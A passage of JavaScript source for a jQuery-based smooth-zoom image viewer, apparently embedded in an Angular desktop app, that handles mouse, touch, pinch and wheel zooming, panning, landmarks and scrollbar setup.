			// 				buttons[i]._var + "over",
			// 				buttons[i].w + 2,
			// 				buttons[i].h + 2,
			// 				2,
			// 				425,
			// 				self.bu_color,
			// 				self.bu_icon,
			// 				i + 1,
			// 				iconOff ? 50 : 0
			// 			);
			// 		}
			// 	}
			// }

			//Add Events for mouse drag / touch swipe action
			// $(document).bind(self.event_up + self.id, {self: self}, self.mouseUp);

			// if ((self.mouse_drag && !self.hasTouch) || (self.touch_drag && self.hasTouch)) {
			// 	// self.$holder.bind(self.event_down, {self: self}, self.mouseDown);

			// 	if (self.hasTouch) {
			// 		$(document).bind(self.event_move + self.id, {self: self}, self.mouseDrag);

			// 	}
			// }

			$(document).bind('touchend'+ '.sz' + self.id, {self: self}, self.mouseUp);
			$(document).bind('mouseup'+ '.sz' + self.id, {self: self}, self.mouseUp);

			self.$holder.bind('touchstart'+ '.sz', {self: self}, self.mouseDown);
			self.$holder.bind('mousedown'+ '.sz', {self: self}, self.mouseDown);

			$(document).bind('touchmove'+ '.sz' + self.id, {self: self}, self.mouseDrag);
			$(document).bind('mousemove'+ '.sz' + self.id, {self: self}, self.mouseDrag);

			// if ((self.mouse_drag && !self.hasTouch) || (self.touch_drag && self.hasTouch)) {
			// 	self.$holder.bind(self.event_down, {self: self}, self.mouseDown);

			// 	if (self.hasTouch) {
			// 		$(document).bind(self.event_move + self.id, {self: self}, self.mouseDrag);

			// 	}
			// }

			//Add Double click / Double tap zoom
			// if (self.mouse_dbl_click) {
			// 	var dClickedX,
			// 		dClickedY,
			// 		dbl_click_dir = 1;

			// 	self.$holder.bind('dblclick.sz', function (e) {
			// 		self.focusOffX = e.pageX - $holder.offset().left - (self.sW / 2);
			// 		self.focusOffY = e.pageY - $holder.offset().top - (self.sH / 2);
			// 		self.changeOffset(true, true);
			// 		self._wheel = false;

			// 		if (self.rA < self.zoom_max && dbl_click_dir == -1 && dClickedX != self.focusOffX && dClickedY != self.focusOffY) {
			// 			dbl_click_dir = 1;
			// 		}

			// 		dClickedX = self.focusOffX;
			// 		dClickedY = self.focusOffY;

			// 		if (self.rA >= self.zoom_max && dbl_click_dir == 1) {
			// 			dbl_click_dir = -1;
			// 		}
			// 		if (self.rA <= self.rF && dbl_click_dir == -1) {
			// 			dbl_click_dir = 1;
			// 		}
			// 		if (dbl_click_dir > 0) {
			// 			self.rA *= 2;
			// 			self.rA = self.rA > self.zoom_max ?  self.zoom_max : self.rA;
			// 			cFlag._zi = true;
			// 			clearTimeout(self.ani_timer);
			// 			self._playing = true;
			// 			self.Animate();
			// 			cFlag._zi = false;

			// 		} else {
			// 			self.rA /= 2;
			// 			self.rA =  self.rA < self.rF ? self.rF : self.rA;
			// 			cFlag._zo = true;
			// 			clearTimeout(self.ani_timer);
			// 			self._playing = true;
			// 			self.Animate();
			// 			cFlag._zo = false;
			// 		}
			// 		e.preventDefault();
			// 		e.stopPropagation();
			// 	});
			// }

			//Add mouse wheel event if enabled
			if (self.mouse_wheel) {
				$holder.bind('mousewheel.sz', {self: this}, self.mouseWheel);
				// $holder.on('mousewheel.sz', {self: this}, self.mouseWheel);
				// $holder.on("mousewheel", throttle(function(e) {
				//     if (e.ctrlKey) {
				//         e.preventDefault();
				//         e.stopPropagation();
				//         e.data = {
				//         	self : self
				//         }
				//         self.mouseWheel(e, e.originalEvent.wheelDelta / Math.abs(e.originalEvent.wheelDelta));
				//         return false;
				//     }
				// }, 200));
			}

			//Auto Hide the control buttons if enabled
			// if (self.bu_auto) {
			// 	$holder.bind('mouseleave.sz', {self: this}, self.autoHide);
			// }

			//Prevent Controls Bg from start dragging image
			// $controls.bind(self.event_down, function (e) {
			// 	e.preventDefault();
			// 	e.stopPropagation();
			// });

			//Prevent Controls Bg from double click zoom
			if (self.mouse_dbl_click) {
				$controls.bind('dblclick.sz', function (e) {
					e.preventDefault();
					e.stopPropagation();
				});
			}

			//Prevent text selection for smoother dragging and button focus
			// $('.noSel').each(function () {
				// this.onselectstart = function () {
				// 	return false;
				// };
			// });

			self.$holder = $holder;
			// self.$controls = $controls;
			self.sW = sW;
			self.sH = sH;
			self.cBW = cBW;
			self.cBH = cBH;

			//Apply initial transformation
			self.Animate();
		},


		/*Prepare the container (holder) element and get landmarks if available
		***********************************************************************************************************************/
		setContainer: function () {
			var self = this,
				$image = self.$image,
				bord_size = self.bord_size,
				border = self.border,
				$holder = self.$holder;

			//Wrap a container for image or get the container if specified through options:
			if (self.container == '' && self.image_url == '') {
				$holder = self.$image.wrap(
					'<div class="noSel smooth_zoom_preloader">\
					</div>'
				).parent();

			} else {
				if (self.image_url == ''){
					$holder = $('#'+self.container);
				} else {
					$holder = self.$elem;
				}
				$holder.addClass('noSel smooth_zoom_preloader');
				self.locations = [];
				self.$loc_cont = $holder.find('.landmarks');
				if (self.$loc_cont[0]) {
					var locs = self.$loc_cont.children('.item');
					self.loc_clone = self.$loc_cont.clone();
					self.show_at_zoom = parseInt(self.$loc_cont.data('show-at-zoom'),10) / 100;
					self.allow_scale = checkBoolean(self.$loc_cont.data('allow-scale'));
					self.allow_drag = checkBoolean(self.$loc_cont.data('allow-drag'));
					locs.each(function () {
						self.setLocation($(this));
					});
				}
			}

			$holder.css({
				'position': 'relative',
				'overflow': 'hidden',
				'text-align': 'left',
				'-moz-user-select': 'none',
				'-khtml-user-select': 'none',
				'-webkit-user-select': 'none',
				'user-select': 'none',
				'-webkit-touch-callout': 'none',
				'-ms-touch-action': 'none',
				'-webkit-tap-highlight-color': 'rgba(255, 255, 255, 0)',
				'background-color': self.bg_color,
				'background-position': 'center center',
				'background-repeat': 'no-repeat'
			})

			self.$hitArea = $('<div style="position: absolute; z-index: 1; top: 0px; left: 0px; width: 100%; height: 100%;" ></div>').appendTo($holder);

			self.getContainerSize(self.sW, self.sH, $holder, self.w_max, self.h_max);

			// if (self.responsive) {
			$(window).bind("orientationchange.sz" + self.id+" resize.sz" + self.id, {self: self}, self.resize);
			// $(window).on("resize.zoomPlugin", {self: self}, self.resize);
			// }
			var sW = self.sW;
			var sH = self.sH;

			//Add Image container properties
			$holder.css({
				'width': sW,
				'height': sH
			});

			$holder.append(`<div class="smooth_zoom_scrollbar horizontal"><div class="smooth_zoom_scrollbar_thumbnail"></div></div>`);
			$holder.append(`<div class="smooth_zoom_scrollbar vertical"><div class="smooth_zoom_scrollbar_thumbnail"></div></div>`);
			$holder.append(`<div class="smooth_zoom_navigator" style="display: none;">
					<div class="background">
						<div class="viewport">
							<div class="viewport-overlay t"></div>
							<div class="viewport-overlay b"></div>
							<div class="viewport-overlay l"></div>
							<div class="viewport-overlay r"></div>
						</div>
					</div>
				</div>`);

			self.scrollbar = {
				horizontal: $(".smooth_zoom_scrollbar.horizontal .smooth_zoom_scrollbar_thumbnail"),
				vertical: $(".smooth_zoom_scrollbar.vertical .smooth_zoom_scrollbar_thumbnail"),
				navigator: $(".smooth_zoom_navigator"),
				navigatorViewport: $(".smooth_zoom_navigator .viewport"),
			}

			//Add border if needed
			if (bord_size > 0) {
				border[0] = $('<div style="position: absolute;	width: ' + bord_size + 'px; height: ' + sH + 'px;	top: 0px; left: 0px; z-index: 3; background-color: ' + self.bord_color + ';"></div>').css('opacity', self.bord_alpha);
				border[1] = $('<div style="position: absolute;	width: ' + bord_size + 'px; height: ' + sH + 'px;	top: 0px; left: ' + (sW - bord_size) + 'px; z-index: 4; background-color: ' + self.bord_color + ';"></div>').css('opacity', self.bord_alpha);
				border[2] = $('<div style="position: absolute;	width: ' + (sW - (bord_size * 2)) + 'px; height: ' + bord_size + 'px; top: 0px; left: ' + bord_size + 'px; z-index: 5; background-color: ' + self.bord_color + '; line-height: 1px;"></div>').css('opacity', self.bord_alpha);
				border[3] = $('<div style="position: absolute;	width: ' + (sW - (bord_size * 2)) + 'px; height: ' + bord_size + 'px; top: ' + (sH - bord_size) + 'px; left: ' + bord_size + 'px; z-index: 6; background-color: ' + self.bord_color + '; line-height: 1px;"></div>').css('opacity', self.bord_alpha);
				$holder.append(border[0], border[1], border[2], border[3]);
			}

			//Get Image maps if exists
			if ($image.attr('usemap') != undefined) {
				self.mapAreas = $("map[name='" + ($image.attr('usemap').split('#').join('')) + "']").children('area');
				self.mapAreas.each(function (i) {
					var area = $(this);
					area.css('cursor', 'pointer');
					if (self.mouse_drag) {
						area.bind(self.event_down, {self: self}, self.mouseDown);
					}
					if (self.mouse_wheel) {
						area.bind('mousewheel.sz', {self: self}, self.mouseWheel);
					}
					self.map_coordinates.push(area.attr('coords').split(','));
				});
			}

			const $bitmapViewerContainer = $(`<div id="bitmap-viewer"></div>`)
			self.bitmapViewer = new BitmapViewer($bitmapViewerContainer[0], self);
			$holder.append($bitmapViewerContainer);

			self.$holder = $holder;
			self.sW = sW;
			self.sH = sH;
		},

		getContainerSize: function (sW, sH, $holder, w_max, h_max){
			// if (sW === '' || sW === 0) {
			// 	if (this.image_url == '') {
			// 		sW = Math.max($holder.parent().width(), 100);
			// 	} else {
			// 		sW = Math.max($holder.width(), 100);
			// 	}

			// } else if (!isNaN(sW) || String(sW).indexOf('px') > -1) {
			// 	sW = this.oW = parseInt(sW);
			// 	if (this.responsive) {
			// 		sW = Math.min($holder.parent().width(), sW);
			// 	}
			// } else if (String(sW).indexOf('%') > -1) {
			// 	sW = $holder.parent().width() * (sW.split('%')[0] / 100);
			// } else {
			// 	sW = 100;
			// }
			// if (w_max !== 0 && w_max !== '') {
			// 	sW = Math.min(sW, w_max);
			// }
			// if (sH === '' || sH === 0) {
			// 	if (this.image_url == '') {
			// 		sH = Math.max($holder.parent().height(), 100);
			// 	} else {
			// 		sH = Math.max($holder.height(), 100);
			// 	}
			// } else if (!isNaN(sH) || String(sH).indexOf('px') > -1) {
			// 	sH = this.oH = parseInt(sH);

			// } else if (String(sH).indexOf('%') > -1) {
			// 	sH = $holder.parent().height() * (sH.split('%')[0] / 100);
			// } else {
			// 	sH = 100;
			// }
			// if (h_max !== 0 && h_max !== '') {
			// 	sH = Math.min(sH, h_max);
			// }

			if (this.oW && sW !== this.oW) {
				if (this.oH && this.maintain_ratio) {
					sH = sW/(this.oW/this.oH);
				}
			}

			this.sW = $holder.parent().width();
			this.sH = $holder.parent().height();
		},


		/*Each landmark / location / lable initiated here
		***********************************************************************************************************************/
		setLocation: function (lc){
			var self = this,
				ob = lc,
				w2, h2, pos, sc;

			if (prop_origin) {
				ob.css(prop_origin, '0 0');
			}

			ob.css({
				'display': 'block',
				'z-index': 2
			})
			if (self.use3D) {
				ob.css({
					'-webkit-backface-visibility': 'hidden',
					// '-webkit-perspective': 1000
				});
			}

			w2 = ob.outerWidth() / 2;
			h2 = ob.outerHeight() / 2;
			pos = ob.data('position').split(',');
			sc = ob.data('allow-scale');
			if (sc == undefined) {
				sc = self.allow_scale;
			} else {
				sc = checkBoolean(sc);
			}

			if (ob.hasClass('mark')) {
				var imgw = ob.find('img').css('vertical-align', 'bottom').width();
				$(ob.children()[0]).css({
					'position': 'absolute',
					'left': (-ob.width()/2),
					'bottom': parseInt(ob.css('padding-bottom'))*2
				});
				var txt = ob.find('.text');
				self.locations.push({
					ob: ob,
					x: parseInt(pos[0]),
					y: parseInt(pos[1]),
					w2: w2,
					h2: h2,
					w2pad: w2+(txt[0] ? parseInt(txt.css('padding-left')) : 0),
					vis: false,
					lab: false,
					lpx: '0',
					lpy: '0',
					showAt: isNaN(ob.data('show-at-zoom'))? self.show_at_zoom : parseInt(ob.data('show-at-zoom'),10) / 100,
					scale: sc
				});

			} else if (ob.hasClass('lable')){
				var bg = ob.data('bg-color'),
					opacity = ob.data('bg-opacity'),
					cont = $(ob.eq(0).children()[0])
							.css({
							'position': 'absolute',
							'z-index': 2,
							left: -w2,
							top: -h2
						});

				self.locations.push({
					ob: ob,
					x: parseInt(pos[0]),
					y: parseInt(pos[1]),
					w2: w2,
					h2: h2,
					w2pad: w2,
					vis: false,
					lab: true,
					lpx: '0',
					lpy: '0',
					showAt: isNaN(ob.data('show-at-zoom'))? self.show_at_zoom : parseInt(ob.data('show-at-zoom'),10) / 100,
					scale: sc
				});

				if (bg !=="") {
					if (!bg) {
						bg = "#000000";
						opacity = .7;
					}
					var bgob = $('<div style="position: absolute; left: ' + (-w2)+'px; top: ' + (-h2)+'px; width: ' + ((w2-parseInt(cont.css('padding-left'))) * 2) + 'px; height:' + ((h2-parseInt(cont.css('padding-top'))) * 2) + 'px; background-color: ' + bg + ';"></div>').appendTo(ob);
					if (opacity) {
						bgob.css('opacity', opacity);
					}
				}
			}
			ob.hide();
			if(prop_transform) {
				ob.css('opacity', 0);
			}
			if (!self.allow_drag) {
				ob.bind(self.event_down, function (e) {
					//e.preventDefault();
					e.stopPropagation();
				})
			}
		},

		/*Storing the original style of image (needed only when destroying)
		***********************************************************************************************************************/
		getStyle: function () {
			var el = this.$image;
			return {
				prop_origin: [prop_origin, prop_origin !== false && prop_origin !== undefined ? el.css(prop_origin) : null],
				prop_transform: [prop_transform, prop_transform !== false && prop_transform !== undefined ? el.css(prop_transform) : null],
				'position': ['position', el.css('position')],
				'z-index': ['z-index', el.css('z-index')],
				'cursor': ['cursor', el.css('cursor')],
				'left': ['left', el.css('left')],
				'top': ['top', el.css('top')],
				'width': ['width', el.css('width')],
				'height': ['height', el.css('height')]
			};
		},

		/*Find the scale ratios
		***********************************************************************************************************************/
		checkRatio: function (sW, sH, iW, iH, zoom_fit) {
			var rF;
			if (iW == sW && iH == sH) {
				rF = 1;
			} else if (iW < sW && iH < sH) {
				rF = sW / iW;
				if (zoom_fit) {
					if (rF * iH > sH) {
						rF = sH / iH;
					}
				} else {
					if (rF * iH < sH) {
						rF = sH / iH;
					}
					if (sW / iW !== sH / iH && this.mouse_drag) {
						this._moveCursor = true;
						this.$image.css('cursor', '-webkit-grab');
						this.$hitArea.css('cursor', '-webkit-grab');
					}
				}
			} else {

				rF = sW / iW;
				if (zoom_fit) {
					if (rF * iH > sH) {
						rF = sH / iH;
					}
					if (rF< this.init_zoom && this.mouse_drag) {
						this._moveCursor = true;
						this.$image.css('cursor', '-webkit-grab');
						this.$hitArea.css('cursor', '-webkit-grab');
					}
				} else {
					if (rF * iH < sH) {
						rF = sH / iH;
					}
					if (sW / iW !== sH / iH && this.mouse_drag) {
						this._moveCursor = true;
						this.$image.css('cursor', '-webkit-grab');
						this.$hitArea.css('cursor', '-webkit-grab');
					}
				}
			}
			return rF;
		},


		/*Returns distance between 2 points (used for touch gesture)
		***********************************************************************************************************************/
		getDistance: function (x1,y1,x2,y2) {
			return Math.sqrt(Math.abs(((x2-x1)*(x2-x1)) + ((y2-y1)*(y2-y1))));
		},


		/*Image Events for Dragging and Mouse Wheel
		***********************************************************************************************************************/
		mouseDown: function (e) {

			if (e && e.button >= 3) {
        		return;
        	}

        	if (e && e.button === 0 && (e.ctrlKey || e.metaKey)) {
        		$bodyScope.startDrag && $bodyScope.startDrag();
        		return;
        	}

			if (!$scope) {
				$scope = angular.element("body").scope();
			}
			if ($scope.isCommentMode || e.button === 2 || e.button === 1) {
				return;
			}

			var self = e.data.self,
			te = e.originalEvent,
			touches, fingers, pointerMouse;
			self._onfocus = self._dragging = false;
			self._mousedown = true;
			if (self.cFlag._nd) {
				self._onHitArea = true;
				self.samePointRelease = false;
				if (self.fixMoz) {
					self.correctTransValue();
				}
				if (e.type == self.pointerDown){
					pointerMouse = (te.MSPOINTER_TYPE_MOUSE && te.pointerType === te.MSPOINTER_TYPE_MOUSE) || te.pointerType == 'mouse';
					self.pointers.push({pageX: te.pageX, pageY:te.pageY, id: te.pointerId});
					fingers = self.pointers.length;
					touches = self.pointers;
				}
				if (e.type == 'mousedown' || pointerMouse){
					self.stX = te.pageX || e.pageX;
					self.stY = te.pageY || e.pageY;
					self.offX = self.stX - self.$holder.offset().left - self.$image.position().left;
					self.offY = self.stY - self.$holder.offset().top - self.$image.position().top;
					// $(document).bind(self.event_move + self.id, {self: self}, self.mouseDrag);

				} else {
					if (e.type == 'touchstart')	{
						fingers = te.targetTouches.length;
						touches = te.touches;
					}
					if (fingers > 1) {
						self._pinching = true;
						self._rA = self.rA;
						self.dStart = self.getDistance(touches[0].pageX, touches[0].pageY, touches[1].pageX, touches[1].pageY);
					} else {
						self.offX = touches[fingers-1].pageX - self.$holder.offset().left - self.$image.position().left;
						self.offY = touches[fingers-1].pageY - self.$holder.offset().top - self.$image.position().top;
						self.setDraggedPos(touches[fingers-1].pageX - self.$holder.offset().left - self.offX, touches[fingers-1].pageY - self.$holder.offset().top - self.offY, self._sc);
						self._recent = 'drag';
						self._dragging = true;
					}
				}

			}
			if (e.type == 'mousedown'  || e.type == self.pointerDown) {
				e.preventDefault();
			}
		},


		/*Mouse Drag / Touch swipe operations handled here
		***********************************************************************************************************************/
		mouseDrag: function (e) {

			var self = e.data.self,
			te = e.originalEvent,
			touches, fingers;

if (!self._mousedown) return;
			//Mouse
			if (e.type == 'mousemove') {
				self.setDraggedPos(e.pageX - self.$holder.offset().left - self.offX, e.pageY - self.$holder.offset().top - self.offY, self._sc);
				self._recent = 'drag';
				self._dragging = true;

				// if (self.pan_limit) {
				// 	if (self.dY < 40) {
				// 		self.dY = 40;
				// 	}
				// 	// console.log(self.offY + self._y);
				// 	// console.log(self.offY);
				// 	// console.log(self.dY);
				// 	// else if (self.dY > self.sH * self._sc + self.stY) {
				// 	// 	self.dY = self.sH * self._sc + self.stY;
				// 	// }
				// 	// console.log("self.dY = %d, self.sH = %d, self.stY = %d", self.dY, self.sH * self._sc, self.stY);
				// 	// if (self.sH - self.dY - self._h - 40 <= 0) {
				// 	// 	self.dY = self.sH - self._h - 40;
				// 	// }
				// 	console.log(self.sH - self.dY - 40)
				// 	console.log(self);
				// }

				// if(!self._playing) {
				self.Animate();
				// }
				return false;

			//Touch and pointer
			} else {
				if (self._dragging || self._pinching) {
					e.preventDefault();
				}
				if (self._onHitArea) {

					//Pointer
					if (e.type == self.pointerMove){
						for (var j=0; j<self.pointers.length; j++){
							if (te.pointerId == self.pointers[j].id) {
								self.pointers[j].pageX = te.pageX;
								self.pointers[j].pageY = te.pageY;
							}
						}
						touches = self.pointers;
						fingers = self.pointers.length;

					//Touch
					} else {
						touches = te.touches;
						fingers = touches.length;
					}

					//Multi finger movement / pinch zoom
					if (fingers > 1) {
						if (!self._pinching) {
							self._pinching = true;
							self._rA = self.rA;
							self.dStart = self.getDistance(touches[0].pageX, touches[0].pageY, touches[1].pageX, touches[1].pageY);
						}
						self._centx = (touches[0].pageX + touches[1].pageX) / 2;
						self._centy = (touches[0].pageY + touches[1].pageY) / 2;
						self.focusOffX = self._centx - self.$holder.offset().left - (self.sW / 2);
						self.focusOffY = self._centy - self.$holder.offset().top - (self.sH / 2);
						self.changeOffset(true, true);
						self._wheel = true;
						self._dragging = false;
						if (self.zoom_single){
							self.sRed = 300;
						} else {
							self.dEnd = self.getDistance(touches[0].pageX, touches[0].pageY, touches[1].pageX, touches[1].pageY);
							self.rA = self._rA * (self.dEnd/self.dStart);
							self.rA = self.rA > self.zoom_max ? self.zoom_max : self.rA;
							self.rA = self.rA < self.rF ? self.rF : self.rA;
						}
						if (self._sc < self.rA) {
							self.cFlag._zo = false;
							self.cFlag._zi = true;
						} else {
							self.cFlag._zi = false;
							self.cFlag._zo = true;
						}
						// if (!self._playing) {
							self.Animate();
						// }

					//Single finer / pointer Drag
					} else {
						self.setDraggedPos(touches[0].pageX - self.$holder.offset().left - self.offX, touches[0].pageY - self.$holder.offset().top - self.offY, self._sc);
						self._recent = 'drag';
						self._dragging = true;
						// if(!self._playing) {
							self.Animate();
						// }
						return false;
					}
				}

			}
		},


		/*Global Mouse Up / Touch End
		***********************************************************************************************************************/
		mouseUp: function (e) {
			var self = e.data.self;
			self._mousedown = false;
			self.pointers = [];
			//If one of the buttons released
			if (self._onButton) {
				self.$holder.find('#' + self.buttons[self.cButtId]._var + 'norm').show();
				self.$holder.find('#' + self.buttons[self.cButtId]._var + 'over').hide();
				if (self.cButtId !== 6) {
					self.cFlag[self.buttons[self.cButtId]._var] = false;
				}
				if (e.type == 'touchend' && self.buttons[self.cButtId].$ob.css('opacity') > .5){
					// self.buttons[self.cButtId].$ob.css('opacity', .7);
				}
				self._onButton = false;
				e.stopPropagation();
				return false;

			//If the mouse drag or touch swipe completed
			} else if (self._onHitArea) {
				if (!self.hasTouch){
					// $(document).unbind(self.event_move + self.id);
					// $(document).unbind('touchmove'+ '.sz' + self.id);
					// $(document).unbind('mousemove'+ '.sz' + self.id);
				}
				if (self.mouse_drag || self.touch_drag) {

					//Mouse
					if (e.type == 'mouseup') {
						if (self.stX ==  e.pageX && self.stY == e.pageY) {
							self.samePointRelease = true;
						}
						self._recent = 'drag';
						self._dragging = false;
						// if(!self._playing) {
							self.Animate();
						// }

					//Touch & Pointers
					} else {
						e.preventDefault();
						self._dragging = false;
						if (self._pinching) {
							self._pinching = false;
							self._wheel = false;
							self.cFlag._nd = true;
							self.cFlag._zi = false;
							self.cFlag._zo = false;
						} else {
							self._recent = 'drag';
							// if(!self._playing) {
								self.Animate();
							// }
						}
					}
					self._onHitArea = false;
				}
			}
		},


		/*Mouse wheel zoom in-out
		***********************************************************************************************************************/
		mouseWheel: function (e, delta) {

			if (!$scope) {
				$scope = angular.element("body").scope();
			}

			var limit = 12;
			var self = e.data.self;
			var scrollBehavior = $scope.preferences.habits.scrollBehavior || "scroll";
			if (self._dragging) return;
			if ((!e.metaKey && !e.ctrlKey && !e.altKey) || (scrollBehavior === 'paging') && (!e.metaKey && !e.ctrlKey && !e.altKey)) {
				switch (scrollBehavior) {
					case 'scroll':
						if (!e.deltaX) { e.deltaX = e.originalEvent.deltaX; }
						if (!e.deltaY) { e.deltaY = -e.originalEvent.deltaY; }
						if (!e.deltaFactor) { e.deltaFactor = 1; }
						var horizontal = e.deltaX * e.deltaFactor;
						var vertical = e.deltaY * e.deltaFactor;
						// console.log(vertical)
						if (!horizontal && !vertical) return;
						if (Math.abs(vertical) > 0 &&  Math.abs(horizontal) > 0) {
							var offsetV = vertical / 1.2;
							self.tY += offsetV;
							self._y = self.tY;
							var offsetH = horizontal / 1.2;
							self.tX -= offsetH;
							self._x = self.tX;
						}
						else if (Math.abs(vertical) > Math.abs(horizontal)) {
							var offset = vertical / 1.2;
							self.tY += offset;
							self._y = self.tY;
						}
						else {
							var offset = horizontal / 1.2;
							self.tX -= offset;
							self._x = self.tX;
						}
						if (horizontal || vertical) {
							self.changeOffset(true, true);
							self.Animate();
						}
						return;
						break;
					case 'paging':
						event.preventDefault();
						event.stopPropagation();
						if (!e.deltaX) { e.deltaX = e.originalEvent.deltaX; }
						if (!e.deltaY) { e.deltaY = -e.originalEvent.deltaY; }
						if (!e.deltaFactor) { e.deltaFactor = 1; }
						clearTimeout(pagingTimeout);
						pagingTimeout = setTimeout(function () {
							// next
							if ( e.deltaY < 0 ) {
								$scope.selectNext(event);
							}
							else if ( e.deltaY === 0 && e.deltaX > 0) {
								$scope.selectNext(event);
							}
							// prev
							else if ( e.deltaY > 0 ) {
								$scope.selectPrev(event);
							}
						}, 50);
						return;
						break;
					case 'zoom':
						e.altKey = true;
						break;
				}

			}

			if (!delta) {
				delta = -e.originalEvent.deltaY * 5;
			}

			if (e.ctrlKey) {
				if( process.platform == 'darwin' ) {
					delta = delta / 50;
					limit = 1;
				}
			}
			else {
				delta = e.originalEvent.wheelDelta / 100;
			}

			if (Math.abs(e.originalEvent.wheelDelta) < limit) {
				return;
			}
			self._onfocus = self._dragging = false;

			if (self.mouse_wheel_cur) {

				if (!e.pageX) {
					e.pageX = e.originalEvent.pageX;
				}

				if (!e.pageY) {
					e.pageY = e.originalEvent.pageY;
				}

				self.focusOffX = e.pageX - self.$holder.offset().left - (self.sW / 2);
				self.focusOffY = e.pageY - self.$holder.offset().top - (self.sH / 2);
				self.changeOffset(true, true);
			}

			self._dragging = false;
			if (delta > 0) {
				if (self.rA != self.zoom_max) {
					if (self.zoom_single){
						if(!self._wheel) {
							self.sRed = 300;
						}
					} else {
						self.rA *= delta < 1 ? 1 + (.2 * delta) : 1.2;
						self.rA = self.rA > self.zoom_max ? self.zoom_max : self.rA;
					}
					self._wheel = true;
					self.cFlag._zi = true;
					clearTimeout(self.ani_timer);
					self._playing = true;
					self.Animate();
					self.cFlag._zi = false;
				}
			}
			else {
				if (self.rA != self.rF) {
					if (self.zoom_single){
						if(!self._wheel) {
							self.sRed = 300;
						}
					} else {
						self.rA /= delta > -1 ? 1 + (.2 * -delta) : 1.2;
						self.rA = self.rA < self.rF ? self.rF : self.rA;
					}
					self._wheel = true;
					self.cFlag._zo = true;
					clearTimeout(self.ani_timer);
					self._playing = true;
					self.Animate();
					self.cFlag._zo = false;
				}
			}


			// UPDATE VIEW
			if (!$scope) {
				$scope = angular.element("body").scope();
			}

			$scope.imageSize.zoomRatioExp = self.rA * 100;
			$scope.imageSize.zoomRatio = $scope.getRatioNonExp($scope.imageSize.zoomRatioExp);

			if ($scope.updateDetailSlider) {
				$scope.updateDetailSlider($scope.imageSize.zoomRatioExp);
			}

			$scope.imageSize.modified = true;
			// console.log($scope.imageSize.zoomRatio)
			// clearTimeout(mousewheelTimeout);
			// mousewheelTimeout = setTimeout(function () {
				$scope.$evalAsync();
			// }, 50);

			return false;
		},


		/*Control buttons Auto hide
		***********************************************************************************************************************/
		autoHide: function (e) {
			var self = e.data.self;

			clearTimeout(self.auto_timer);
			self.auto_timer = setTimeout(function () {
				self.$controls.fadeOut(0);
			}, self.bu_delay);

			self.$holder.bind('mouseenter.sz', function (e) {
				clearTimeout(self.auto_timer);
				self.$controls.fadeIn(0);
			});
		},


		/*Mozilla works differently than others when getting translated positions. So this correction needed
		***********************************************************************************************************************/
		correctTransValue: function () {
			var v = this.$image.css('-moz-transform').toString().replace(')', '').split(',');
			this.transOffX = parseInt(v[4]);
			this.transOffY = parseInt(v[5]);
		},


		/*Make sure the dragged position obeying limits
		***********************************************************************************************************************/
		setDraggedPos: function (xp, yp, s) {
			var self = this;

			if (xp !== '') {
				self.dX = xp + self.transOffX;
				// console.log("xp=%d, yp=%d, s=%d", xp, yp, s);
				// if (self.pan_limit) {
				// 	self.dX = self.dX + (s * self.iW) < self.sW ? self.sW - (s * self.iW) : self.dX;
				// 	self.dX = self.dX > 0 ? 0 : self.dX;
				// 	if ((s * self.iW) < self.sW) {
				// 		self.dX = (self.sW - (s * self.iW)) / 2;
				// 	}
				// } else {
					// self.dX = self.dX + (s * self.iW) < self.sW / 2 ? (self.sW / 2) - (s * self.iW) : self.dX;
					// self.dX = self.dX > self.sW / 2 ? self.sW / 2 : self.dX;
				// }
			}
			if (yp !== '') {
				self.dY = yp + self.transOffY;
				// if (self.pan_limit) {
				// 	if (self.dY < 40) {
				// 		self.dY = 40;
				// 	}
				// 	else if (self.dY > self.sH - self._h - 40 / self._sc) {
				// 		self.dY = self.sH - self._h - 40 / self._sc;
				// 	}
				// }
			}
		},

		/*Called to animate image transformation whenever the navigation events occur
		***********************************************************************************************************************/
		Animate: function (noAnimate) {
			// console.count("Animate")
			var self = this;
			var pixTol = .5;

			self.cFlag._nd = true;
			self.ani_end = false;

			// if (noAnimate) {
			// 	self.ani_end = true;
			// 	self.cFlag._nd = true;
			// 	self.ani_end = true;
			// }

			//Zoom In
			if (self.cFlag._zi) {
				if (!self._wheel && !self.zoom_single) {
					self.rA *= self.zoom_speed;
				}
				if (self.rA > self.zoom_max) {
					self.rA = self.zoom_max;
				}
				self.cFlag._nd = false;
				self.cFlag._rs = false;
				self._recent = 'zoomIn';
				self._onfocus = self._dragging = false;
			}

			//Zoom Out
			if (self.cFlag._zo) {
				if (!self._wheel && !self.zoom_single) {
					self.rA /= self.zoom_speed;
				}
				if (self.zoom_min !=0 ) {
					if (self.rA < self.zoom_min) {
						self.rA = self.zoom_min;
					}
				} else {
					if (self.rA < self.rF) {
						self.rA = self.rF;
					}
				}

				self.cFlag._nd = false;
				self.cFlag._rs = false;
				self._recent = 'zoomOut';
				self._onfocus = self._dragging = false;
			}

			//Zoom In or Out - Single Step
			if (self.zoom_single && !self.cFlag._rs) {
				if (self._recent == 'zoomIn'){
					self.sRed +=(10-self.sRed)/6;
					self.rA += (self.zoom_max - self.rA)/(((1/(self.pan_speed_o+1))*self.sRed)+1);

				} else if (self._recent == 'zoomOut'){
					self.sRed +=(3-self.sRed)/3;
					self.rA += (self.rF - self.rA)/(((1/self.pan_speed_o+1)*self.sRed)+1);
				}
			}

			//Pan speed needs to adjust according to application dimension and zoom level
			self.pan_speed = (Math.max(1, 1+((self.sW + self.sH) / 500))+ (self.pan_speed_o * self.pan_speed_o / 4)) / Math.max(1, self.rA/2);

			//Move Left
			if (self.cFlag._ml) {
				self.oX -= self.pan_speed;
				self.cFlag._nd = false;
				self.cFlag._rs = false;
				self._recent = 'left';
				self._onfocus = self._dragging = false;
			}

			//Move Right
			if (self.cFlag._mr) {
				self.oX += self.pan_speed;
				self.cFlag._nd = false;
				self.cFlag._rs = false;
				self._recent = 'right';
				self._onfocus = self._dragging = false;
			}

			//Move Up
			if (self.cFlag._mu) {
				self.oY -= self.pan_speed;
				self.cFlag._nd = false;
				self.cFlag._rs = false;
				self._recent = 'up';
				self._onfocus = self._dragging = false;
			}

			//Move Down
			if (self.cFlag._md) {
				self.oY += self.pan_speed;
				self.cFlag._nd = false;
				self.cFlag._rs = false;
				self._recent = 'down';
				self._onfocus = self._dragging = false;
			}

			//Reset
			if (self.cFlag._rs) {
				self.oX += (self.fX - self.oX) / 8;
				self.oY += (self.fY - self.oY) / 8;
				self.cFlag._nd = false;
				self._recent = 'reset';
				self._onfocus = self._dragging = false;
			}

			//Find scale value, width and height
			//Case 1: Single Step Zoom
			if (self.zoom_single && (self._recent !== 'reset')) {
				if (self._onfocus){
